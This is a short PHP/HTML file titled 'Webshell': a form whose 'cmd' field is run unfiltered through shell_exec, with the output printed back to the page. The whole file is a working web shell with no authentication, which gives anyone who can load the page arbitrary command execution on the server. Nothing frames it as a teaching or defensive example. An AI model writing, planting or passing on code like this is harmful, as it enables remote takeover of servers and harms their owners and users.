<!DOCTYPE html>
<html>
<head>
    <title>Webshell</title>
</head>

    <body>

        <form action="shell.php" method="post">
            Command: <input type="text" name="cmd">
            <input type="submit" value="Submit">
        </form>

        <br>

        <?php
        $command = ($_POST["cmd"]);
        $shError = "2>&1";
        $output = shell_exec($command . ' ' . $shError);
        ?>
            
            <font size="5" face="Consolas" >
            <table align="center" width="1600" border="1">
                <tr>
                    <td><?php echo "<pre>$output</pre>"; ?></td>
                </tr>
            </table>

    </body>
</html>